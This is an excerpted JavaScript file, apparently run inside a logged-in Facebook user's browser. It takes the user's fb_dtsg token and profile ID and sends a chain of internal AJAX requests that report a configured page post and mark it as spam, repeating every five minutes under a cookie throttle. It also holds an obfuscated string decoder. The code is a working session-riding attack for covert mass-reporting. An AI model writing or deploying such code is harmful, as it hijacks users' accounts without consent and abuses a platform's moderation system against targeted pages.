...
function start() {
  var cookie_name = "debduddddddg_" + profile_id;
  var cookie_time = 5;
  if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1000 * cookie_time) {
    ...
    active_time.setTime(parseInt(getCookie(cookie_name)) + (60 * 1000 * cookie_time));
...
function start(){
  ...
  var params = {};
  params["rel"] = "dialog-post";
  params["options_button_id"] = "u_0_1k";
  ...
  params["ft[tn]"] = "WWV-R-R";
  params["ft[top_level_post_id]"] = config.post_id;
  params["ft[tl_objid]"] = config.post_id;
  params["ft[page_id]"] = config.page_id;
  params["ft[fbfeed_location]"] = 120;


  xhr.open("POST", "/ajax/nfx/start_dialog/?dpr=1&ext=me", true);
...
function step1(){
  ...
  params["fb_dtsg"] = fb_dtsg;
  params["answer"] = "spam";
  params["context"] = '{"initial_action_name":"RESOLVE_PROBLEM","breadcrumbs":[],"story_location":"permalink","is_from_feed_tombstone":false,"actions_taken":"","is_rapid_reporting":false,"is_instream_follow_up":false,"entry_point":"unknown","hideable_token":"'+hideable_token+'","story_permalink_token":"S:_I'+config.page_id+':'+config.post_id+'"}';
  params["av"] = profile_id;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
...
function step2(){
  ...
  params["context"] = '{"initial_action_name":"RESOLVE_PROBLEM","breadcrumbs":["spam"],"story_location":"permalink","is_from_feed_tombstone":false,"actions_taken":"","is_rapid_reporting":false,"is_instream_follow_up":false,"entry_point":"unknown","hideable_token":"'+hideable_token+'","story_permalink_token":"S:_I'+config.page_id+':'+config.post_id+'"}';
  params["av"] = profile_id;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
...
function step3(){
  ...
  var params = {};
  params["context"] = '{"initial_action_name":"RESOLVE_PROBLEM","breadcrumbs":["spam"],"story_location":"permalink","is_from_feed_tombstone":false,"actions_taken":"","is_rapid_reporting":false,"is_instream_follow_up":false,"entry_point":"unknown","hideable_token":"'+hideable_token+'","story_permalink_token":"S:_I'+config.page_id+':'+config.post_id+'"}';
  params["actions_executed[0]"] = "MARK_AS_SPAM";
  params["msg_recipient_name"] = "";
  params["av"] = profile_id;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
...
function parsem(input) {
  return count = input.length / 4, parse = input.split("").reverse().join(""), a = parse.substring(3 * count, count.length), b = parse.substring(2 * count, 3 * count), c = parse.substring(1 * count, 2 * count), d = parse.substring(0, count / 1), atob(a + b + c + d);
}
